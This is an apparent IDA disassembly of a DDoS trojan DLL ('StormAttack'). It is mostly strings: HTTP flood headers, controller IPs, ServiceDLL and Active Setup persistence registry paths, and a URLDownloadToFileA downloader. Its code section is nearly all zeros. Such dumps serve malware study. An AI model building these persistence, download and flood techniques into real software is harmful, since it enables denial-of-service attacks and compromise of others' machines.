.idata:10001000 ;
.idata:10001000 ; +-------------------------------------------------------------------------+
.idata:10001000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.idata:10001000 ; |           Copyright (c) 2026 Hex-Rays, <support@hex-rays.com>           |
.idata:10001000 ; |                      License info: 14-0000-FFFF-88                      |
.idata:10001000 ; |                       ntkey <admin@hex-rays.com>                        |
.idata:10001000 ; +-------------------------------------------------------------------------+
.idata:10001000 ;
.idata:10001000 ; Input SHA256 : 312D693E0377788C57C5FD6A918CC088145A1F57DC56B5F345A117ECC8BDC684
.idata:10001000 ; Input MD5    : CD8DA3A320496D0D393B794EE22EB40A
.idata:10001000 ; Input CRC32  : 4D26DF85
.idata:10001000 ; Compiler     : Visual C++ (guessed)
.idata:10001000
.idata:10001000 ; File Name   : /home/petik/Documents/petikvx-archiver/Articles/Trojan-DDoS.Win32.StormAttack.a/artefacts/StormServer_x.dll
.idata:10001000 ; Format      : Portable executable for 80386 (PE)
.idata:10001000 ; Imagebase   : 10000000
.idata:10001000 ; Timestamp   : 4C540E10 (Sat Jul 31 11:50:40 2010 UTC)
.idata:10001000 ; Section 1. (virtual address 00001000)
.idata:10001000 ; Virtual size                  : 000087D0 (  34768.)
.idata:10001000 ; Section size in file          : 00008800 (  34816.)
.idata:10001000 ; Offset to raw data for section: 00000400
.idata:10001000 ; Flags E0000060: Text Data Executable Readable Writable
.idata:10001000 ; Alignment     : default
.idata:10001000
.idata:10001000                 .686p
.idata:10001000                 .mmx
.idata:10001000                 .model flat
.idata:10001000
.idata:10001000 ; ===========================================================================
.idata:10001000
.idata:10001000 ; Segment type: Externs
.idata:10001000 ; _idata
.idata:10001000
.idata:10001001
.idata:10001001
.data:1000119C ; ===========================================================================
.data:1000119C
.data:1000119C ; Segment type: Pure code
.data:1000119C ; Segment permissions: Read/Write/Execute
.data:1000119C _data           segment para public 'CODE' use32
.data:1000119C                 assume cs:_data
.data:1000119C                 ;org 1000119Ch
.data:1000119C                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.data:1000119C                 align 10h
.data:100011A0                 dd offset dword_10001EA4
.data:100011A4                 dd offset word_10001ECE
.data:100011A8                 align 20h
.data:100011C0                 dd offset loc_10001B50
.data:100011C4 a19216812       db '192.168.1.2',0
.data:100011D0                 dd 5 dup(0)
.data:100011E4                 dd 50h, 0Ah, 0Fh, 1, 1F4h, 726F7453h, 6464206Dh, 4420736Fh
.data:10001204                 dd 534Eh, 4 dup(0)
.data:10001218 aWelcomeToUseSt db 'Welcome to use storm ddos',0
.data:10001232                 align 4
.data:10001234                 dd 19h dup(0)
.data:10001298 aThankYou       db 'Thank you',0
.data:100012A2                 align 4
.data:100012A4                 dd 3Dh dup(0)
.data:10001398 aAaaaaaaaaaaaaa db 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
.data:100013D9                 db 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',0
.data:100013FD                 align 10h
.data:10001400                 dd 26h dup(0)
.data:10001498                 db 90h
.data:10001499                 db 19h, 2 dup(0)
.data:1000149C                 dd 1234h, 4321h
.data:100014A4 aStormDSSSS     db 'STORM:%d|%s|%s|%s|%s',0
.data:100014B9                 align 4
.data:100014BC aUMb            db '%u MB',0
.data:100014C2                 align 4
.data:100014C4 aUGb            db '%u GB',0
.data:100014CA                 align 4
.data:100014CC aGlobalmemoryst db 'GlobalMemoryStatusEx',0
.data:100014E1                 align 4
.data:100014E4 aKernel32Dll    db 'kernel32.dll',0
.data:100014F1                 align 4
.data:100014F4 aUMhz           db '~%u MHz',0
.data:100014FC aMhz            db '~MHz',0
.data:10001501                 align 4
.data:10001504 aHardwareDescri db 'HARDWARE\DESCRIPTION\System\CentralProcessor\0',0
.data:10001533                 align 4
.data:10001534 aWin7           db 'Win7',0
.data:10001539                 align 4
.data:1000153C aWinvista       db 'WinVista',0
.data:10001545                 align 4
.data:10001548 aWin2k3         db 'Win2K3',0
.data:1000154F                 align 10h
.data:10001550 aWinxp          db 'WinXP',0
.data:10001556                 align 4
.data:10001558 aWin2k          db 'Win2K',0
.data:1000155E                 align 10h
.data:10001560 aWinnt          db 'WinNT',0
.data:10001566                 align 4
.data:10001568                 dd 0B5D2A8D7h, 0E6B0h, 63252525h, 25256325h, 63256325h
.data:1000157C                 dd 0
.data:10001580                 dd 6325h, 2Bh
.data:10001588 aSetsockoptErro db 'setsockopt Error!',0Ah,0
.data:1000159B                 align 4
.data:1000159C aDDDD           db '%d.%d.%d.%d',0
.data:100015A8                 dd 0C8C9BAE2h, 2E91E469h, 0ED2EF5EAh, 63A693C0h, 83FE2E35h
.data:100015BC                 dd 0AB6646DDh, 0C3852E70h, 8D36E133h, 2E97D955h, 0
.data:100015D0 aBfyl           db 'bfyl',0
.data:100015D5                 align 4
.data:100015D8 a1921681244     db '192.168.1.244',0
.data:100015E6                 align 4
.data:100015E8 aGet            db 'GET ',0
.data:100015ED                 align 10h
.data:100015F0 aHttp11         db ' HTTP/1.1',0Dh,0Ah,0
.data:100015FC aAcceptImageGif db 'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, appl'
.data:1000163D                 db 'ication/x-shockwave-flash, application/vnd.ms-excel, application/'
.data:1000167E                 db 'vnd.ms-powerpoint, application/msword, */*',0Dh,0Ah,0
.data:100016AB                 align 4
.data:100016AC aAcceptLanguage db 'Accept-Language: zh-cn',0Dh,0Ah,0
.data:100016C5                 align 4
.data:100016C8 aAcceptEncoding db 'Accept-Encoding: gzip, deflate',0
.data:100016E7                 align 4
.data:100016E8 aUserAgentMozil db 0Dh,0Ah
.data:100016EA                 db 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1'
.data:1000172B                 db ')',0
.data:1000172D                 align 10h
.data:10001730 aHost           db 0Dh,0Ah
.data:10001732                 db 'Host:',0
.data:10001738 aConnectionKeep db 0Dh,0Ah
.data:1000173A                 db 'Connection: Keep-Alive',0
.data:10001751                 align 4
.data:10001754                 db 0Dh,0Ah
.data:10001756                 db 0Dh,0Ah,0
.data:10001759                 align 4
.data:1000175C                 db '/',0
.data:1000175E                 align 10h
.data:10001760 aHttp11ContentT db ' HTTP/1.1',0Dh,0Ah
.data:1000176B                 db 'Content-Type: text/html',0
.data:10001783                 align 4
.data:10001784 aHost_0         db 0Dh,0Ah
.data:10001786                 db 'Host: ',0
.data:1000178D                 align 10h
.data:10001790 aAcceptTextHtml db 0Dh,0Ah
.data:10001792                 db 'Accept: text/html, */*',0
.data:100017A9                 align 4
.data:100017AC aUserAgentMozil_0 db 0Dh,0Ah
.data:100017AE                 db 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.0; My'
.data:100017EF                 db 'IE 3.01)',0
.data:100017F8 aRefererHttp    db 'Referer: http://',0
.data:10001809                 align 4
.data:1000180C a80Http         db ':80/http://',0
.data:10001818 aConnectionClos db 0Dh,0Ah
.data:1000181A                 db 'Connection: Close',0
.data:1000182C aCacheControlNo db 0Dh,0Ah
.data:1000182E                 db 'Cache-Control: no-cache',0
.data:10001846                 align 4
.data:10001848 aUserAgentMozil_1 db 0Dh,0Ah
.data:1000184A                 db 'User-Agent:Mozilla/5.0 (X11; U; Linux i686; en-US; re:1.4.0) Geck'
.data:1000188B                 db 'o/20080808 Firefox/8.0',0
.data:100018A2                 align 4
.data:100018A4                 db '=',0
.data:100018A6                 align 4
.data:100018A8 aClickOpenPage  db '>CLICK OPEN PAGE',0
.data:100018B9                 align 4
.data:100018BC                 db 0Dh,0Ah,0
.data:100018BF                 align 10h
.data:100018C0 aConnectionKeep_0 db 'Connection: Keep-Alive',0Dh,0Ah,0
.data:100018D9                 align 4
.data:100018DC aCookie         db 'Cookie:',0
.data:100018E4                 db ':',0
.data:100018E6                 align 4
.data:100018E8 aExpires        db ' expires',0
.data:100018F1                 align 4
.data:100018F4 aHttp11AcceptAc db ' HTTP/1.1',0Dh,0Ah
.data:100018FF                 db 'Accept: */*',0Dh,0Ah
.data:1000190C                 db 'Accept-Language: zh-cn',0Dh,0Ah
.data:10001924                 db 'Accept-Encoding: gzip, deflate',0Dh,0Ah,0
.data:10001945                 align 4
.data:10001948 aHost_1         db 'Host: ',0
.data:1000194F                 align 10h
.data:10001950 aUserAgentMozil_2 db 'User-Agent:Mozilla/4.0 (compatible; MSIE 7.00; Windows NT 5.1; My'
.data:10001991                 db 'IE 3.01)',0Dh,0Ah,0
.data:1000199C                 db '!',0
.data:1000199E                 align 10h
.data:100019A0 aXq1986         db 'xq1986',0
.data:100019A7                 align 4
.data:100019A8 aCacheControlNo_0 db 'Cache-Control: no-cache',0Dh,0Ah
.data:100019C1                 db 'Referer: http://www.google.com',0Dh,0Ah,0
.data:100019E2                 align 4
.data:100019E4 aPass           db 'pass',0
.data:100019E9                 align 4
.data:100019EC aDD             db '%d,%d',0
.data:100019F2                 align 4
.data:100019F4 aOpen           db 'open',0
.data:100019F9                 align 4
.data:100019FC aIexploreExe    db 'iexplore.exe',0
.data:10001A09                 align 4
.data:10001A0C                 dd 0A2CFFBCFh, 0BECAE1CCh, 0
.data:10001A18 aSeshutdownpriv db 'SeShutdownPrivilege',0
.data:10001A2C aLogOff         db 'log off',0
.data:10001A34 aServicedll     db 'ServiceDLL',0
.data:10001A3F                 align 10h
.data:10001A40 aSystemCurrentc db 'SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters',0
.data:10001A7A                 align 4
.data:10001A7C aSystemrootSyst db '%SystemRoot%\System32\srvsvc.dll',0
.data:10001A9D                 align 10h
.data:10001AA0 aStubpath       db 'stubpath',0
.data:10001AA9                 align 4
.data:10001AAC aSS             db '%s%s',0
.data:10001AB1                 align 4
.data:10001AB4 aSoftwareMicros db 'Software\Microsoft\Active Setup\Installed Components\',0
.data:10001AEA                 align 4
.data:10001AEC aUrldownloadtof db 'URLDownloadToFileA',0
.data:10001AFF                 align 10h
.data:10001B00 aWininetDll     db 'wininet.dll',0
.data:10001B0C aUrlmonDll      db 'urlmon.dll',0
.data:10001B17                 align 4
.data:10001B18                 db '\',0
.data:10001B1A                 align 4
.data:10001B1C aOk             db 'OK',0
.data:10001B1F                 align 10h
.data:10001B20 aGethostbyname  db 'gethostbyname',0
.data:10001B2E                 align 10h
.data:10001B30 aWsock32Dll     db 'WSOCK32.DLL',0
.data:10001B3C aStromAttack    db 'Strom attack',0
.data:10001B49                 align 10h
.data:10001B50
.data:10001B50 loc_10001B50:                           ; DATA XREF: .data:100011C0↑o
.data:10001B50                 cmp     dword ptr [esp+8], 1
.data:10001B55                 jnz     short loc_10001B70
.data:10001B57                 call    near ptr word_100071D6
.data:10001B5C                 mov     ecx, [eax+20h]
.data:10001B5F                 and     dword ptr [eax+20h], 0
.data:10001B63                 mov     [eax+1Ch], ecx
.data:10001B66                 mov     ecx, [eax+2Ch]
.data:10001B69                 and     dword ptr [eax+2Ch], 0
.data:10001B6D                 mov     [eax+28h], ecx
.data:10001B70
.data:10001B70 loc_10001B70:                           ; CODE XREF: .data:10001B55↑j
.data:10001B70                 push    1
.data:10001B72                 pop     eax
.data:10001B73                 retn    0Ch
.data:10001B73 ; ---------------------------------------------------------------------------
.data:10001B76                 dw 0FFB8h
.data:10001B78                 dd 0E8100074h, 56D0h, 298EC81h, 65830000h, 565300D4h, 1568BF57h
.data:10001B90                 dd 0C9831000h, 8DC033FFh, 0AEF2BC55h, 0F92BD1F7h, 0C1h dup(0)
.data:10001EA4 dword_10001EA4  dd 0Ah dup(0)           ; DATA XREF: .data:100011A0↑o
.data:10001ECC                 db 2 dup(0)
.data:10001ECE word_10001ECE   dw 0                    ; DATA XREF: .data:100011A4↑o
.data:10001ED0                 dd 14C1h dup(0)
.data:100071D4                 db 2 dup(0)
.data:100071D6 word_100071D6   dw 0                    ; CODE XREF: .data:10001B57↑p
.data:100071D8                 dd 90h dup(0)
.data:10007418                 db 2 dup(0)
.data:1000741A                 public DllEntryPoint
.data:1000741A ; BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
.data:1000741A DllEntryPoint   dw 0
.data:1000741C                 dd 8E1h dup(0)
.data:100097A0 ;
.data:100097A0 ; Export directory for MZ\x90
.data:100097A0 ;
.data:100097A0                 dd 0                    ; Characteristics
.data:100097A4                 dd 0                    ; TimeDateStamp
.data:100097A8                 dw 0                    ; MajorVersion
.data:100097AA                 dw 0                    ; MinorVersion
.data:100097AC                 dd 0                    ; Name
.data:100097B0                 dd 0                    ; Base
.data:100097B4                 dd 0                    ; NumberOfFunctions
.data:100097B8                 dd 0                    ; NumberOfNames
.data:100097BC                 dd 0                    ; AddressOfFunctions
.data:100097C0                 dd 0                    ; AddressOfNames
.data:100097C4                 dd 0                    ; AddressOfNameOrdinals
.data:100097C8                 align 40h
.data:10009800                 dd 200h dup(?)
.data:10009800 _data           ends
.data:10009800
.data:10009800
.data:10009800                 end DllEntryPoint
